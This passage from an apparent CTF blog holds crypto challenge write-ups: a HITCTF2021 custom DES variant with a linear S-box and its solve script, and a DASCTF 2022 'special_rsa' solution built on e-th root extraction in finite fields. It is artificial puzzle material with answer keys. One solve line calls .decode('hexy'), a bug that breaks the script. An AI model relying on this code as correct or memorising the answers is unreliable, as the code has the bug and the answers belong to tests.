class="line"></span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">PC_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">PC_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># What is R???</span></span><br><span class="line"><span class="comment"># len of R = 16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mysbox</span>(<span class="params">bits</span>):</span></span><br><span class="line">    a,b,c,d,e,f = (bits[<span class="number">0</span>],bits[<span class="number">1</span>],bits[<span class="number">2</span>],bits[<span class="number">3</span>],bits[<span class="number">4</span>],bits[<span class="number">5</span>])</span><br><span class="line">    <span class="keyword">return</span> [a^b,d^c^a,f^b^c,d^a,e^f]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chr_to_bits</span>(<span class="params">c</span>):</span></span><br><span class="line">    res = <span class="built_in">bin</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(res.rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_bits</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        res.extend(chr_to_bits(c))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits_to_chr</span>(<span class="params">bits</span>):</span></span><br><span class="line">    res = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, bits)), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits_to_str</span>(<span class="params">bits</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">        res += bits_to_chr(bits[i:i+<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_bits</span>(<span class="params">l,r</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> (x,y):x^y, <span class="built_in">zip</span>(l,r))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span>(<span class="params">hblk, subkey</span>):</span></span><br><span class="line">    bits = [hblk[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> E]  <span class="comment"># 扩展置换</span></span><br><span class="line">    bits = xor_bits(bits, subkey)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">6</span>):</span><br><span class="line">        val = Mysbox(bits[i:i+<span class="number">6</span>])</span><br><span class="line">        res.extend(<span class="built_in">map</span>(<span class="built_in">int</span>, val))</span><br><span class="line">    res = [res[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> P]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span>(<span class="params">blk, subkeys</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(blk)==<span class="number">8</span>  <span class="comment"># 8bytes = 64bits</span></span><br><span class="line">    bits = str_to_bits(blk)</span><br><span class="line">    bits = [bits[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> IP]  <span class="comment"># 置换IP</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):  <span class="comment"># 8轮</span></span><br><span class="line">        left = bits[:<span class="number">32</span>]  <span class="comment"># 左右分割</span></span><br><span class="line">        right = bits[<span class="number">32</span>:]</span><br><span class="line">        left = xor_bits(left, F(right, subkeys[i]))   <span class="comment"># R的XOR</span></span><br><span class="line">        bits = right + left</span><br><span class="line">    bits = left + right  <span class="comment"># 左右对调</span></span><br><span class="line">    bits = [bits[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> IP_1]   <span class="comment"># 逆置换IP</span></span><br><span class="line">    <span class="keyword">return</span> bits_to_str(bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span>(<span class="params">key</span>):</span></span><br><span class="line">    kbits = str_to_bits(key)</span><br><span class="line">    kbits = [kbits[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> PC_1]</span><br><span class="line">    left = kbits[:<span class="number">28</span>]</span><br><span class="line">    right = kbits[<span class="number">28</span>:]</span><br><span class="line">    subkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        left = left[R[i]:]+left[:R[i]]</span><br><span class="line">        right = right[R[i]:]+right[:R[i]]</span><br><span class="line">        cur = left+right</span><br><span class="line">        subkeys.append([cur[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> PC_2])</span><br><span class="line">    <span class="keyword">if</span> subkeys[<span class="number">0</span>] == subkeys[<span class="number">1</span>] <span class="keyword">or</span> subkeys[<span class="number">0</span>] == subkeys[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Boom&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> subkeys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pt, key</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(pt)%<span class="number">8</span>==<span class="number">0</span></span><br><span class="line">    subkeys = gen_subkey(key)</span><br><span class="line">    ct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">8</span>):</span><br><span class="line">        ct += encrypt_block(pt[i:i+<span class="number">8</span>], subkeys)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span>(<span class="params">blk, subkeys</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(blk)==<span class="number">8</span></span><br><span class="line">    bits = str_to_bits(blk)</span><br><span class="line">    bits = [bits[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> IP]  <span class="comment"># 置换IP</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        left = bits[:<span class="number">32</span>]</span><br><span class="line">        right = bits[<span class="number">32</span>:]</span><br><span class="line">        left = xor_bits(left, F(right, subkeys[ROUNDS-<span class="number">1</span>-i]))  <span class="comment"># R的XOR</span></span><br><span class="line">        bits = right + left</span><br><span class="line">    bits = left + right  <span class="comment"># 左右对调</span></span><br><span class="line">    bits = [bits[x-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> IP_1]  <span class="comment"># 逆置换IP</span></span><br><span class="line">    <span class="keyword">return</span> bits_to_str(bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ct, key</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ct)%<span class="number">8</span>==<span class="number">0</span></span><br><span class="line">    subkeys = gen_subkey(key)</span><br><span class="line">    pt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), <span class="number">8</span>):</span><br><span class="line">        pt += decrypt_block(ct[i:i+<span class="number">8</span>], subkeys)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> key,flag</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">32</span></span><br><span class="line">    <span class="comment">#flag: HITCTF2021&#123;xxxxxxxxxxxxxxxxxx&#125;</span></span><br><span class="line">    <span class="built_in">print</span> encrypt(flag,key).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="comment">#e8e2d4985cbe22055041bba9dab1b5bb4ce2d6de4e27bdec4e648ebd3b5112f4</span></span><br><span class="line">    <span class="comment"># get key, solve game.</span></span><br><span class="line">    <span class="comment"># 通过 明文 &#x27;HITCTF20&#x27; 和 对应密文 获得key</span></span><br><span class="line">    <span class="comment"># 用key 解密 完整密文</span></span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><ul><li><a href="https://crypto.stackexchange.com/questions/53751/non-linearity-of-an-sbox">https://crypto.stackexchange.com/questions/53751/non-linearity-of-an-sbox</a></li></ul><p>在题目代码下 附加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">m=<span class="string">&#x27;nefuyyds&#x27;</span></span><br><span class="line">m1=<span class="string">&#x27;HITCTF20&#x27;</span></span><br><span class="line">c1=<span class="string">&#x27;e8e2d4985cbe2205&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">c2=<span class="string">&#x27;5041bba9dab1b5bb&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">c3=<span class="string">&#x27;4ce2d6de4e27bdec&#x27;</span>.decode(<span class="string">&#x27;hexy&#x27;</span>)</span><br><span class="line">c4=<span class="string">&#x27;4e648ebd3b5112f4&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment">#e8e2d4985cbe22055041bba9dab1b5bb4ce2d6de4e27bdec4e648ebd3b5112f4</span></span><br><span class="line">y=encrypt(m,key)</span><br><span class="line">m2=strxor(m1,strxor(m,decrypt(strxor(y,strxor(<span class="built_in">str</span>(c1),<span class="built_in">str</span>(c2))),key)))</span><br><span class="line">m3=strxor(m1,strxor(m,decrypt(strxor(y,strxor(<span class="built_in">str</span>(c1),<span class="built_in">str</span>(c3))),key)))</span><br><span class="line">m4=strxor(m1,strxor(m,decrypt(strxor(y,strxor(<span class="built_in">str</span>(c1),<span class="built_in">str</span>(c4))),key)))</span><br><span class="line">m = m1+m2+m3+m4</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF Apr X FATE 防疫挑战赛WP</title>
      <link href="/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/"/>
      <url>/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="队伍信息"><a href="#队伍信息" class="headerlink" title="队伍信息"></a>队伍信息</h1><ul><li><p>名称：村通网队</p></li><li><p>成员：4人</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115701837.png" alt="Members"></p></li><li><p>排名：30</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115549485.png" alt="rank"></p></li></ul><h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><ul><li><p>2道Crypto，总3道</p></li><li><p>2道Misc， 总5道<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115837848.png" alt="detail"></p></li><li><p>其中Crypto方向第8名<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115900240.png" alt="Rank for crypto"></p></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="special-rsa"><a href="#special-rsa" class="headerlink" title="special_rsa"></a>special_rsa</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPrime1</span>(<span class="params">bitLength, e</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = getPrime(bitLength)</span><br><span class="line">        <span class="keyword">if</span> (i - <span class="number">1</span>) % e ** <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">flag=<span class="string">b&#x27;DASCTF&#123;????????????????????&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">lenth = ((<span class="built_in">len</span>(<span class="built_in">bin</span>(m)) - <span class="number">2</span>) // <span class="number">2</span>) + <span class="number">9</span></span><br><span class="line">e=<span class="number">113</span></span><br><span class="line">p = getPrime1(lenth, e)</span><br><span class="line">q = getPrime1(lenth, e)</span><br><span class="line">n=p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    lenth = ((<span class="built_in">len</span>(<span class="built_in">bin</span>(c)) - <span class="number">2</span>) // <span class="number">2</span>) + <span class="number">9</span></span><br><span class="line">    p = getPrime1(lenth, e)</span><br><span class="line">    q = getPrime1(lenth, e)</span><br><span class="line">    n=p*q</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    c=<span class="built_in">pow</span>(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># output.txt</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line"><span class="attr">e</span>=<span class="number">113</span></span><br><span class="line"><span class="attr">c</span>=<span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br></pre></td></tr></table></figure><p>可知</p><ul><li><p>flag被rsa加密后产生的密文C 就是 下次一次加密的明文，即：<strong>循环加密密文</strong></p></li><li><p>附件给出了e、所有的n 、最后的C</p></li><li><p>根据n，利用分解网站依次写出对应p、q</p></li><li><p>由p、q生成过程发现，e|(q-1) 且 e|(p-1)</p><p>简单的e，phi不互素不能处理gcd(e, phi) = e的情况</p><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">参考</a>以下原理</p><blockquote><p>e 和 p−1 （或 q−1）的最大公约数就是 e 本身，也就是说 e∣(p−1)，只有对 c 开 e 次方根才行。</p><p>可以将同余方程 m^e ≡ c (modn) 化成</p><p>m^e ≡ c (modp)</p><p>m^e ≡ c (modq)</p><p>然后分别在 GF(p) 和 GF(q) 上对 c 开 e 次方根，再用CRT组合一下即可得到在 modn 下的解。</p><p>问题是，<strong>如何在有限域内开根</strong>？</p><p>这里 e 与 p−1 和 q−1 都不互素，不能简单地求个逆元就完事。</p><p>这种情况下，<strong>开平方根</strong>可以用<code>Tonelli–Shanks algorithm</code>，<a href="https://en.wikipedia.org/wiki/Tonelli–Shanks_algorithm">Wiki</a>说这个算法可以<strong>扩展到开n次方根</strong>。</p><p>在这篇<a href="https://arxiv.org/pdf/1111.4877.pdf">paper</a>里给出了具体的算法：<code>Adleman-Manders-Miller rth Root Extraction Method</code>。</p><p>这个算法只能开出一个根，实际上开 e 次方，最多会有 e 个根（这题的情况下有0x1337个根）。</p><p>如何找到其他根？</p><p><a href="https://stackoverflow.com/questions/6752374/cube-root-modulo-p-how-do-i-do-this">StackOverflow – Cube root modulo P</a> 给出了方法。</p><p>如何找到所有的<code>primitive 0x1337th root of 1</code>?</p><p><a href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field">StackExchange – Finding the n-th root of unity in a finite field</a> 给出了方法。</p><p><strong>Exploit</strong>（以 <code>e=0x1337</code> 为例）</p><ul><li>先用<code>Adleman-Manders-Miller rth Root Extraction Method</code>在 GF(p) 和 GF(q) 上对 c 开 e 次方根，分别得到一个解。大概不到10秒。</li><li>然后去找到所有的<code>0x1336</code>个<code>primitive nth root of 1</code>，乘以上面那个解，得到所有的<code>0x1337</code>个解。大概1分钟。</li><li>再用CRT对 GF(p) 和 GF(q) 上的两组<code>0x1337</code>个解组合成 modn 下的解，可以得到<code>0x1337**2=24196561</code>个 modn 的解。最后能通过<code>check()</code>的即为flag。大概十几分钟。</li></ul></blockquote><p>解出后，发现不止一个解，需要初步筛选</p><p>由c = m^e mod n 原理 以及 循环加密的逻辑，不难发现<strong>解出来的 m    得小于  上一个n</strong></p><p>即使加上以上限定条件，仍有些m解出来不只1个</p><p>所以，当解到一组无解时，需要更换 无解这组之前的m（<strong>下面会用 列表表示  每次解得的 所有符合条件的m</strong></p><p>直到打印出预期的c0 (flag加密得来)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 